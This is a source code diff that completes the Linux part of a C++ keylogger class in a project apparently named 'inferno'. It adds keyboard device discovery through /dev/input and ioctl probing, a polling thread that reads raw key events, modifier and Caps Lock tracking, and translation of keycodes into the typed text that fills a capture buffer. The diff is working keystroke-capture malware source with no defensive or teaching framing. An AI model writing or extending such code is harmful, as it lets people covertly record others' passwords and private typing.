@@ -10,7 +10,13 @@
 #include <fcntl.h>
 #include <unistd.h>
 #include <linux/input.h>
+#include <linux/input-event-codes.h>
 #include <dirent.h>
+#include <poll.h>
+#include <sys/ioctl.h>
+#include <climits>
+#include <cerrno>
+#include <cstring>
 #endif
 
 namespace inferno {
@@ -29,6 +35,13 @@ KeyLogger::KeyLogger() : m_running(false) {
     m_hook_thread_id = 0;
 #elif defined(__linux__)
     m_input_fd = -1;
+    m_left_shift_pressed = false;
+    m_right_shift_pressed = false;
+    m_caps_active = false;
+    m_left_ctrl_pressed = false;
+    m_right_ctrl_pressed = false;
+    m_left_alt_pressed = false;
+    m_right_alt_pressed = false;
 #endif
 }
 
@@ -330,6 +343,222 @@ void KeyLogger::stop() {
 
 #elif defined(__linux__)
 
+// ── Device Discovery ──────────────────────────────────────────
+
+std::string KeyLogger::findKeyboardDevice() {
+    // Strategy 1: /dev/input/by-path/ — udev-managed symlinks
+    // Names like "pci-0000:00:14.0-usb-0:5:1.0-event-kbd" or
+    // "platform-i8042-serio-0-event-kbd" (PS/2)
+    const char* by_path = "/dev/input/by-path/";
+    DIR* dir = opendir(by_path);
+    if (dir) {
+        struct dirent* entry;
+        while ((entry = readdir(dir)) != nullptr) {
+            std::string name(entry->d_name);
+            if (name.find("-kbd") != std::string::npos ||
+                name.find("-keyboard") != std::string::npos) {
+                std::string full_path = std::string(by_path) + name;
+                char resolved[PATH_MAX];
+                if (realpath(full_path.c_str(), resolved)) {
+                    closedir(dir);
+                    return std::string(resolved);
+                }
+            }
+        }
+        closedir(dir);
+    }
+
+    // Strategy 2: iterate /dev/input/event* and probe via ioctl
+    // This covers systems without udev/by-path (containers, embedded, etc.).
+    // Iterating the directory avoids hard-coding an event index limit.
+    DIR* input_dir = opendir("/dev/input/");
+    if (!input_dir) return "";
+
+    struct dirent* entry;
+    while ((entry = readdir(input_dir)) != nullptr) {
+        std::string name(entry->d_name);
+        if (name.find("event") != 0) continue;
+
+        std::string path = std::string("/dev/input/") + name;
+        int fd = ::open(path.c_str(), O_RDONLY | O_NONBLOCK);
+        if (fd < 0) continue;
+
+        // Check that the device supports keys (EV_KEY) and has at least
+        // typical keyboard keys (ENTER + a letter key)
+        unsigned long ev_bits[2] = {0};
+        unsigned long key_bits[KEY_CNT / (sizeof(unsigned long) * 8) + 1] = {0};
+
+        int rc = ioctl(fd, EVIOCGBIT(0, sizeof(ev_bits)), ev_bits);
+        if (rc >= 0 && (ev_bits[0] & (1UL << EV_KEY))) {
+            rc = ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(key_bits)), key_bits);
+            if (rc >= 0) {
+                auto testBit = [&](int k) -> bool {
+                    return (key_bits[k / (sizeof(unsigned long) * 8)] &
+                            (1UL << (k % (sizeof(unsigned long) * 8)))) != 0;
+                };
+                // Heuristic: a keyboard has ENTER + at least one letter
+                if (testBit(KEY_ENTER) && (testBit(KEY_A) || testBit(KEY_Q))) {
+                    ::close(fd);
+                    return path;
+                }
+            }
+        }
+        ::close(fd);
+    }
+    closedir(input_dir);
+
+    return "";
+}
+
+// ── Keycode Translation ───────────────────────────────────────
+
+void KeyLogger::evdevLoop() {
+    struct pollfd pfd;
+    pfd.fd = m_input_fd;
+    pfd.events = POLLIN;
+
+    while (m_running) {
+        int ret = poll(&pfd, 1, 100);
+        if (ret < 0) {
+            if (errno == EINTR) continue;
+            break;
+        }
+        if (ret == 0) continue;
+
+        if (pfd.revents & (POLLERR | POLLHUP | POLLNVAL)) {
+            break;
+        }
+        if (!(pfd.revents & POLLIN)) continue;
+
+        struct input_event ev;
+        ssize_t n = read(m_input_fd, &ev, sizeof(ev));
+        if (n < (ssize_t)sizeof(ev)) {
+            if (n == 0) break;
+            if (n < 0 && errno != EAGAIN && errno != EINTR) break;
+            continue;
+        }
+
+        // Only process EV_KEY events
+        if (ev.type != EV_KEY) continue;
+
+        uint16_t code = ev.code;
+        uint32_t val  = ev.value; // 0=release, 1=press, 2=repeat
+
+        // ── Modifier state tracking ──
+        if (val == 1 || val == 0) {    // press or release
+            bool pressed = (val == 1);
+            switch (code) {
+                case KEY_LEFTSHIFT:
+                    m_left_shift_pressed = pressed; continue;
+                case KEY_RIGHTSHIFT:
+                    m_right_shift_pressed = pressed; continue;
+                case KEY_CAPSLOCK:
+                    if (pressed) m_caps_active = !m_caps_active;
+                    continue;
+                case KEY_LEFTCTRL:
+                    m_left_ctrl_pressed = pressed; continue;
+                case KEY_RIGHTCTRL:
+                    m_right_ctrl_pressed = pressed; continue;
+                case KEY_LEFTALT:
+                    m_left_alt_pressed = pressed; continue;
+                case KEY_RIGHTALT:
+                    m_right_alt_pressed = pressed; continue;
+            }
+        }
+
+        // Skip autorepeat (value == 2) and releases
+        if (val != 1) continue;
+
+        // Skip pure modifier-only presses (already handled above, but
+        // the switch didn't `continue` for non-modifier keys — add guard)
+        switch (code) {
+            case KEY_LEFTSHIFT:  case KEY_RIGHTSHIFT:
+            case KEY_CAPSLOCK:
+            case KEY_LEFTCTRL:   case KEY_RIGHTCTRL:
+            case KEY_LEFTALT:    case KEY_RIGHTALT:
+                continue;
+        }
+
+        // Skip ctrl+alt combos (typically shortcuts, not typed text)
+        if (m_left_ctrl_pressed || m_right_ctrl_pressed ||
+            m_left_alt_pressed || m_right_alt_pressed) continue;
+
+        bool letter_shifted = (m_left_shift_pressed || m_right_shift_pressed) ^ m_caps_active;
+        bool symbol_shifted = (m_left_shift_pressed || m_right_shift_pressed);
+        std::string key_str;
+
+        // ── Letter keys (Caps Lock applies) ──
+        if (code >= KEY_A && code <= KEY_Z) {
+            char c = 'a' + (code - KEY_A);
+            if (letter_shifted) c -= 32;
+            key_str = std::string(1, c);
+        }
+        // ── Number row (Caps Lock does NOT apply) ──
+        else if (code >= KEY_1 && code <= KEY_0) {
+            static const char digits[] = "1234567890";
+            static const char* symbols[] = {
+                "!", "@", "#", "$", "%", "^", "&", "*", "(", ")"
+            };
+            int idx = code - KEY_1;
+            if (idx >= 0 && idx <= 9) {
+                key_str = symbol_shifted ? symbols[idx] : std::string(1, digits[idx]);
+            }
+        }
+        else switch (code) {
+            case KEY_ENTER:     key_str = "[ENTER]";    break;
+            case KEY_BACKSPACE: key_str = "[BACKSPACE]"; break;
+            case KEY_TAB:       key_str = "[TAB]";      break;
+            case KEY_SPACE:     key_str = " ";          break;
+            case KEY_MINUS:     key_str = symbol_shifted ? "_" : "-";    break;
+            case KEY_EQUAL:     key_str = symbol_shifted ? "+" : "=";    break;
+            case KEY_LEFTBRACE:  key_str = symbol_shifted ? "{" : "[";   break;
+            case KEY_RIGHTBRACE: key_str = symbol_shifted ? "}" : "]";   break;
+            case KEY_SEMICOLON:  key_str = symbol_shifted ? ":" : ";";   break;
+            case KEY_APOSTROPHE: key_str = symbol_shifted ? "\"" : "'";  break;
+            case KEY_GRAVE:     key_str = symbol_shifted ? "~" : "`";    break;
+            case KEY_BACKSLASH: key_str = symbol_shifted ? "|" : "\\";   break;
+            case KEY_COMMA:     key_str = symbol_shifted ? "<" : ",";    break;
+            case KEY_DOT:       key_str = symbol_shifted ? ">" : ".";    break;
+            case KEY_SLASH:     key_str = symbol_shifted ? "?" : "/";    break;
+            case KEY_KPASTERISK: key_str = "*";  break;
+            case KEY_KPMINUS:    key_str = "-";  break;
+            case KEY_KPPLUS:     key_str = "+";  break;
+            case KEY_KPDOT:      key_str = ".";  break;
+            case KEY_KPSLASH:    key_str = "/";  break;
+            case KEY_KPCOMMA:    key_str = ",";  break;
+            case KEY_UP:        key_str = "[UP]";     break;
+            case KEY_DOWN:      key_str = "[DOWN]";   break;
+            case KEY_LEFT:      key_str = "[LEFT]";   break;
+            case KEY_RIGHT:     key_str = "[RIGHT]";  break;
+            case KEY_ESC:       key_str = "[ESC]";    break;
+            case KEY_DELETE:    key_str = "[DEL]";    break;
+            case KEY_HOME:      key_str = "[HOME]";   break;
+            case KEY_END:       key_str = "[END]";    break;
+            case KEY_PAGEUP:    key_str = "[PAGEUP]"; break;
+            case KEY_PAGEDOWN:  key_str = "[PAGEDOWN]"; break;
+            case KEY_INSERT:    key_str = "[INSERT]"; break;
+            case KEY_SYSRQ:     key_str = "[PRTSC]";  break;
+            case KEY_PAUSE:     key_str = "[PAUSE]";  break;
+            case KEY_MENU:      key_str = "[MENU]";   break;
+
+            default:
+                if (code >= KEY_F1 && code <= KEY_F12) {
+                    key_str = "[F" + std::to_string(code - KEY_F1 + 1) + "]";
+                } else if (code >= KEY_KP0 && code <= KEY_KP9) {
+                    key_str = std::string(1, '0' + (code - KEY_KP0));
+                } else {
+                    key_str = "[KEY:" + std::to_string(code) + "]";
+                }
+                break;
+        }
+
+        if (!key_str.empty()) {
+            appendKeystroke(key_str);
+        }
+    }
+    m_running = false;
+}
+
 void KeyLogger::appendKeystroke(const std::string& stroke) {
     std::lock_guard<std::mutex> lock(m_mutex);
     if (m_buffer.size() + stroke.size() <= MAX_BUFFER_SIZE) {
@@ -340,23 +569,46 @@ void KeyLogger::appendKeystroke(const std::string& stroke) {
 void KeyLogger::start() {
     std::lock_guard<std::mutex> lock(m_mutex);
     if (m_running) return;
-    
-    // For Linux, we would search /dev/input/eventX for a keyboard.
-    // This requires root. We'll leave it as a stub that opens the first input for now.
-    // Or we just mark it running and do nothing for the non-blocking polling design.
-    // In a real implementation we'd open the correct fd and poll it in dump() or another loop.
+
+#ifdef INFERNO_TESTING
+    std::cerr << "[KeyLogger] INFERNO_TESTING active. Bypassing evdev device open.\n";
     m_running = true;
-    std::cerr << "[KeyLogger] Linux /dev/input KeyLogger started (stub).\n";
+#else
+    m_device_path = findKeyboardDevice();
+    if (m_device_path.empty()) {
+        std::cerr << "[KeyLogger] No keyboard device found.\n";
+        return;
+    }
+
+    m_input_fd = ::open(m_device_path.c_str(), O_RDONLY | O_NONBLOCK);
+    if (m_input_fd < 0) {
+        std::cerr << "[KeyLogger] Failed to open " << m_device_path << ": "
+                  << std::strerror(errno) << "\n";
+        return;
+    }
+
+    m_running = true;
+    m_evdev_thread = std::thread(&KeyLogger::evdevLoop, this);
+#endif
 }
 
 void KeyLogger::stop() {
+    {
+        std::lock_guard<std::mutex> lock(m_mutex);
+        if (!m_running) return;
+        m_running = false;
+    }
+
+    if (m_evdev_thread.joinable()) {
+        m_evdev_thread.join();
+    }
+
     std::lock_guard<std::mutex> lock(m_mutex);
-    if (!m_running) return;
+
     if (m_input_fd != -1) {
         ::close(m_input_fd);
         m_input_fd = -1;
     }
-    m_running = false;
 }
 
 #endif
